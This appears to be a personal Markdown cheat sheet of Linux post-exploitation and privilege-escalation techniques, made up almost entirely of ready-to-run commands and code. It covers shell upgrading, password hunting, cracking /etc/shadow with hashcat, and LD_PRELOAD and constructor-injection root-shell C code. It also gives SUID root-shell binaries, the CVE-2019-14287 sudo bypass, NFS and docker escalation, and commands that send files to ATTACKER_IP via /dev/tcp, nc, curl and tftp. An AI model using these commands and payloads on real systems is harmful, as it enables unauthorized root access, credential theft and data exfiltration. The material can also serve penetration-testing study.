

### Upgrade to TTY Shell:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
stty rows 38 columns 116
echo os.system("/bin/bash")
/bin/bash -i
```


### System-Enumeration
```bash
hostname 
uname -a
cat /etc/issue
/proc/version
lscpu
ps aux
ps aux | grep username
ps -ef --forest
ps -aux | grep root
env
lsb_release -a
cat /etc/os-release
cat /etc/lsb-release

```

### Usefull find command:
```bash
find . -name flag1.txt: find the file named “flag1.txt” in the current directory
find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory
find / -type d -name config: find the directory named config under “/”
find / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and executable by all users)
find / -perm a=x: find executable files
find /home -user frank: find all files for user “frank” under “/home”
find / -mtime 10: find files that were modified in the last 10 days
find / -atime 10: find files that were accessed in the last 10 day
find / -cmin -60: find files changed within the last hour (60 minutes)
find / -amin -60: find files accesses within the last hour (60 minutes)
find / -size 50M: find files with a 50 MB size
```

### User-Enumeration
```bash
whoami
id
sudo -l
cat /etc/passwd
cat /etc/passwd | cut -d : -f 1
cat /etc/shadows
cat /etc/groups
groups #command
history
sudo su -
```


### Network-Enumeration
```bash
ifconfig or ip a
ip route
arp -a
netstat -ano
```

### Password-Hunting:
```bash
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
locate password,passwd,secret | more
find / -name id_rsa 2> /dev/null
history | grep pass
```

### Extracting and Cracking Passwords
if the shadow file is accessible 
```bash
cat /etc/passwd > passwd_copy.txt
cat /etc/shadow > shadow_copy.txt
unshadow passwd_copy.txt shadow_copy.txt > unshadowed.txt
hashcat -m 1800 unshadowed.txt rockyou.txt --force
```

## Checking environment :
```bash
env
set
```



### Exploiting LD_PRELOAD env :
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```
``
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
ls -al shell.so
sudo LD_PRELOAD=/tmp/shell.so find
id
whoami
```

### Sudo Security Bypass (CVE-2019-14287) :
```bash
# User privilege specification
root    ALL=(ALL:ALL) ALL

hacker ALL=(ALL,!root) /bin/bash
```
```bash
sudo -u#-1 <command>
```

### Sudo Buffer Overflow (pwfeedback):
check out exploit

### SUID Escalation :
```bash
find / -type f -perm -u=s 2> /dev/null
find / -type f -perm -g=s 2> /dev/null
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

###  Capabilities :
```bash
getcap -r / 2>/dev/null
capsh --print
```


###  Privilege escalation using Scheduled-Tasks:
```bash
/etc/init.d
/etc/cron*
/etc/crontab
/etc/cron.allow
/etc/cron.d 
/etc/cron.deny
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
/etc/sudoers
/etc/exports
/etc/anacrontab
/var/spool/cron
/var/spool/cron/crontabs/root
crontab -l
ls -alh /var/spool/cron;
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny*
```

```bash
cat /etc/crontab
crontab -e -u user
```

checkout other root processs :
```
./pspy64 -pf -i 1000
```

###  NFS Root Squashing:
```bash
cat /etc/exports
grep "nfs" /var/log/syslog
showmount -e MACHINE_IP(target ip)
mkdir /tmp/1
mount -o rw,vers=2 MACHINE_IP:/tmp /tmp/1
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
gcc /tmp/1/x.c -o /tmp/1/x
chmod +s /tmp/1/x

victum:
chmod +s /tmp/1/x
```

###  Escalation-Path-Docker:
if the user is member of docker:
```bash
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```


###  $PATH is Dangerous:

```bash
echo $PATH
~/.bash_profile
~/.bashrc
~/.profile
sudo cat /etc/sudoers | grep secure_path
find / -perm -4000 -user root -type f 2>/dev/null #checkout root user with suid bit set
for dir in $(echo $PATH | tr ':' '\n'); do [ -w "$dir" ] && echo "[+] Writable: $dir"; done #Path directory writetable permission.

#malicious file run by root user with suid bit set.
cp /bin/bash /tmp/ls
chmod +x /tmp/ls


```


> [!INFO]
> Editing /etc/passwd File for Privilege Escalation .
> openssl passwd raj
> write these hash in x position of /etc/passwd of user. if passwd have rwx permission




###  Usefull Scripts or C file codes:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);   // Set user ID to root
    setgid(0);   // Set group ID to root
    system("/bin/bash");  // Launch a root shell
    return 0;
}

gcc /tmp/rootme.c -o /tmp/rootme

```

```c
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
```

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}

gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
```



> [!INFO]
> Now at last run linux automation scripts like linpeas or winpeas.



## File transfer :
```bash
# Upload
bash -c 'cat /path/to/file > /dev/tcp/ATTACKER_IP/PORT'

# Download
bash -c 'cat < /dev/tcp/ATTACKER_IP/PORT > file_saved'


# Upload
nc ATTACKER_IP PORT < /path/to/file

# Download
nc ATTACKER_IP PORT > file_saved

# Listen to receive
nc -lnvp PORT > received_file

# Listen to send
nc -lnvp PORT < /path/to/file



# Start HTTP server (Python 3)
python3 -m http.server 2121

# Start HTTP server (Python 2)
python -m SimpleHTTPServer 2121

# Download with wget
wget http://ATTACKER_IP:2121/filename

# Download with curl
curl http://ATTACKER_IP:2121/filename -o file_saved


# Upload
scp -P 2121 /path/to/file user@ATTACKER_IP:/destination/

# Download
scp -P 2121 user@ATTACKER_IP:/path/to/file file_saved


ftp ATTACKER_IP
put /path/to/file
get filename

# Upload
tftp ATTACKER_IP
put /path/to/file

# Download
tftp ATTACKER_IP
get filename


curl -X POST --data-binary @/path/to/file http://ATTACKER_IP:PORT/upload

```

















![[Pasted image 20250505112319.png]]


